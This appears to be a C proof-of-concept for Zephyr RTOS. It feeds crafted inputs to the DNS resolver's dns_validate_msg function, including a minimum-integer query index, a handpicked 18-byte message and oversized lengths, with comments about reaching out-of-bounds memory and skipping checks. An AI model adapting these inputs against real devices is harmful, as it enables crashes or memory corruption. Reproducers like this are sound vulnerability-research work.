#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <zephyr/logging/log.h>
LOG_MODULE_REGISTER(net_dns_resolve_client_sample, LOG_LEVEL_DBG);

#include <zephyr/kernel.h>
#include <zephyr/net/dns_resolve.h>
#include <dns_pack.h>

int dns_validate_msg(struct dns_resolve_context *ctx, struct dns_msg_t *dns_msg, uint16_t *dns_id,
		     int *query_idx, struct net_buf *dns_cname, uint16_t *query_hash);

int main(void) {

	LOG_INF("In Main lbllalala");

	// Model inputs:

	// Query IDX MUST be negative:

	int query_idx = -2147483648;

	// Model network buffer:

	struct net_buf dns_cname;

	// Define the DNS resolve context:

	struct dns_resolve_context ctx;

	// Model DNS message:

	struct dns_msg_t dns_msg;

	// Set the message size:

	const uint16_t msg_size = 18;

	dns_msg.msg_size = msg_size;

	// Set the query offset to be big, past bounds:

	dns_msg.query_offset = 0;
	dns_msg.response_length = 53202;
	dns_msg.response_type = -19;
	dns_msg.response_position = 1;
	dns_msg.answer_offset = 16;

	// Define the DNS data:

    // The 7th value MUST be zero to skip the while loop

	// The 3rd value must be 0x8 to ensure we don't ignore the query
	// Value is & with 0x80 and used in a ternary which returns 1 if the result is not zero.
	// We want this & to be not zero so we can skip past a check that can fail

	uint8_t msg[18] = {7, 7, 141, 128, 0, 1, 0, 1, 25, 158, 96, 70, 0, 0, 1, 0, 1, 0};

	dns_msg.msg = msg;

	// The below can be arbitrary:

	uint16_t dns_id = 0;
	uint16_t query_hash = 0;

	// Call function:

	int res = dns_validate_msg(&ctx, &dns_msg, &dns_id, &query_idx, &dns_cname, &query_hash);

	LOG_INF("Done Main");
}
